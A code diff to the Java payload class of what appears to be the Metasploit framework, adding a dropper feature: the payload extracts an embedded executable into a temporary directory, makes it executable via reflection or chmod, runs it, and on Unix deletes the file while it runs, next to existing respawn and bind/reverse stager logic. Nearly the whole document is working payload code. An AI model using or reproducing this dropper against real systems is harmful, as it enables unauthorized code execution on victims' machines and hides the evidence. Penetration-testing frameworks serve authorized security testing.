@@ -35,7 +35,9 @@ package metasploit;
 
 import java.io.DataInputStream;
 import java.io.File;
+import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
+import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
 import java.io.PrintStream;
@@ -71,8 +73,22 @@ public class Payload extends ClassLoader {
 			propsStream.close();
 		}
 		
+		// check if we should drop an executable
+		String executableName = props.getProperty("Executable");
+		if (executableName != null) {
+			File dummyTempFile = File.createTempFile("~spawn", ".tmp");
+			dummyTempFile.delete();
+			File tempDir = new File(dummyTempFile.getAbsolutePath()+".dir");
+			tempDir.mkdir();
+			File executableFile = new File(tempDir, executableName);
+			writeEmbeddedFile(clazz, executableName, executableFile);
+			props.remove("Executable");
+			props.put("DroppedExecutable", executableFile.getCanonicalPath());
+		}
+		
 		// check if we should respawn
 		int spawn = Integer.parseInt(props.getProperty("Spawn", "0"));
+		String droppedExecutable = props.getProperty("DroppedExecutable");
 		if (spawn > 0) {
 			// decrease count so that eventually the process
 			// will stop spawning
@@ -85,15 +101,8 @@ public class Payload extends ClassLoader {
 			File classFile = new File(tempDir, clazzFile);
 			classFile.getParentFile().mkdirs();
 			// load ourselves via the class loader (works both on disk and from Jar)
-			InputStream in = clazz.getResourceAsStream("/"+clazzFile);
-			FileOutputStream fos = new FileOutputStream(classFile);
-			byte[] buf = new byte[4096];
-			int len;
-			while ((len = in.read(buf)) != -1) {
-				fos.write(buf,0,len);
-			}
-			fos.close();
-			fos = new FileOutputStream(propFile);
+			writeEmbeddedFile(clazz, clazzFile, classFile);
+			FileOutputStream fos = new FileOutputStream(propFile);
 			props.store(fos, "");
 			fos.close();
 			Process proc = Runtime.getRuntime().exec(new String[] {
@@ -124,6 +133,33 @@ public class Payload extends ClassLoader {
 					files[i].deleteOnExit();
 					Thread.sleep(100);
 				}
+			}
+		} else if (droppedExecutable != null) {
+			File droppedFile = new File(droppedExecutable);
+			// File.setExecutable is Java 1.6+, therefore call it via reflection and try
+			// the chmod alternative if it fails. Do not call it at all for Windows.
+			if (!IS_DOS) {
+				try {
+					try {
+						File.class.getMethod("setExecutable", new Class[] {boolean.class}).invoke(droppedFile, new Object[] { Boolean.TRUE});
+					} catch (NoSuchMethodException ex) {
+						// ok, no setExecutable method, call chmod and wait for it	
+						Runtime.getRuntime().exec(new String[] {"chmod", "+x", droppedExecutable}).waitFor();
+					}
+				} catch (Exception ex) {
+					// try to continue anyway, we have nothing to lose
+					ex.printStackTrace();
+				}
+			}
+			
+			// now execute the executable.
+			// tempdir may contain spaces, so do not use the String variant of exec!
+			Runtime.getRuntime().exec(new String[] {droppedExecutable});
+			
+			// Linux and other Unices allow removing files while they are in use
+			if (!IS_DOS) {
+				droppedFile.delete();
+				droppedFile.getParentFile().delete();
 			}
 		} else {
 			// check what stager to use (bind/reverse)
@@ -159,6 +195,17 @@ public class Payload extends ClassLoader {
 			}
 			new Payload().bootstrap(in, out, props.getProperty("EmbeddedStage", null),stageParams);
 		}
+	}
+
+	private static void writeEmbeddedFile(Class clazz, String resourceName, File targetFile) throws FileNotFoundException, IOException {
+		InputStream in = clazz.getResourceAsStream("/"+resourceName);
+		FileOutputStream fos = new FileOutputStream(targetFile);
+		byte[] buf = new byte[4096];
+		int len;
+		while ((len = in.read(buf)) != -1) {
+			fos.write(buf,0,len);
+		}
+		fos.close();
 	}
 	
 	private final void bootstrap(InputStream rawIn, OutputStream out, String embeddedStageName, String[] stageParameters) throws Exception {
